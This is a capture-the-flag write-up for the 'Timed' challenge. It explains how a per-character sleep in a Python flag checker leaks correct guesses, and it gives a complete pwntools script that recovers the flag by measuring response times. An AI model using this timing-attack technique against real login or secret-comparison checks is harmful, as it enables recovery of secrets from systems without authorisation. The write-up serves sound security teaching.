# Timed
>Time may be a fleeting moment; but use this moment to capture the flag.
>
>Save your time; solve locally first
>
>primary: 0.cloud.chals.io:29427
>
>backup: 0.cloud.chals.io:15346
>
>backup: 0.cloud.chals.io:27198
---

All we're given is a single python script, which seems to be the process running on the server we connect to.
```python
import time

flag = open('flag.txt', 'r').readline().strip('\n').lower()
print("[+] Guess the flag >>> ")

user_guess = input().lower()

for i in range(0, len(flag)):
    if i+1 > len(user_guess):
        print("\n[!] Incorrect")
        exit(-1)
    elif (user_guess[i] != flag[i]):
        print("\n[!] Incorrect")
        exit(-1)
    else:
        time.sleep(0.25)

print("\n[+] Access Granted. Your Flag is: %s" %flag)
```
The script itself is pretty simple, it reads the flag from a file, accepts some input, and compares the input to the flag letter by letter. 
Obviously, the flag is what we are trying to guess/get, but from this code it seems almost impossible to extract it. We're given almost no information, just an
`[!] Incorrect` if we guess wrong. Where could we go from here?

# Timing Attack
In cryptography, a timing attack is a [side-channel attack](https://en.wikipedia.org/wiki/Side-channel_attack) that uses the time taken to execute a program
to extract information. In this case, there is a seemingly innocent part of the code that is vulnerable.
```python
    else:
        time.sleep(0.25)
```
This simple sleep function seems to do nothing at first, but it actually leaks a lot of information! If we recorded the time taken for the function to print an
`[!] Incorrect`, we can actually extract whether or not the letters we've supplied are correct. Even better, we don't have to guess the length of the flag, as
the script will automatically exit if `i` goes beyond the length of the input. We can just detect when the input will be a `}`, as that has to be the end of the flag.

## Implementation
First, we obviously have to track the amount of time taken to recieve a reply. We can simply use the python `time` module to keep track of when we submit the input,
and find the difference of that time from when we recieve an input.
```python
then = time.time()
s.send_raw(guess+b"\n")
s.recvuntil(b'[') # start of the next line, whether it be [!] Incorrect or [+] Access Granted.
now = time.time()
delta = now - then
```
Now all we have to do is iterate through an alphabet of possible letters. We know the input gets converted to lowercase, so we can just use `string.ascii_lowercase`
along with `_` and `{}`.

Finally, all we have to do is keep track of how much time we should be expecting. Each letter should take 0.25 seconds, but the program also obviously takes some time to run just by itself. The solution is just adding a little bit of padding time.

## Final Solution
```python
import pwn
import time
import string
# nc 0.cloud.chals.io 29427
solved = False
flag = b"uscg{"
alphabet = "}_" + string.ascii_lowercase + string.digits 
print(alphabet)
timed = len(flag) * 0.25 + 0.15
while not solved:
    for letter in alphabet:
        try:
            trial = flag + letter.encode()
            print(trial)
            s = pwn.remote('0.cloud.chals.io', 15346)
            s.recvuntil(b'[+] Guess the flag >>> ')
            then = time.time()
            s.send_raw(trial+b"\n")
            s.recvuntil(b'[')
            now = time.time()
            s.close()
            print(now - then)
            if now - then > timed:
                flag += letter.encode()
                timed = len(flag) * 0.25 + 0.15
                print(flag)
                if letter == "}":
                    solved = True
                break
        except EOFError:
            s.close()
            pass
```        
Every time the time taken is longer than the previous time, we can add a new character to the string and restart.

Now all we have to do is run the script and get the flag!
```
uscg{not_this_time}
```

## Conclusion
Cool basic challenge, good introduction to time-based attacks if you aren't familiar with them.:clock9:

I recommend exploring this one on your own if you feel a bit confused, this is actually a pretty cool challenge for learning for beginners. 
